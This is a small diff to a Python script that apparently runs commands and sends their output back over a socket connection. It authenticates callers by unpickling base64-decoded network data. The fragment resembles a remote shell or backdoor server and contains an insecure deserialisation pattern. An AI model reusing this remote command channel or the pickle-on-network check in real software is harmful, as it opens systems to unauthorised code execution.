@@ -50,7 +50,7 @@ def main():
                     output = e
                 else:
                     output = e.output
-            conn.send(bytes('b3V0cHV0Cg==' + str(output)))
+            conn.send(bytes(('b3V0cHV0Cg==' + str(output)).encode('utf8')))
             return True
         if rot.decodes(pickle.loads(base64.b64decode(data))) == password:
             conn.send(bytes('correct'.encode('utf8')))
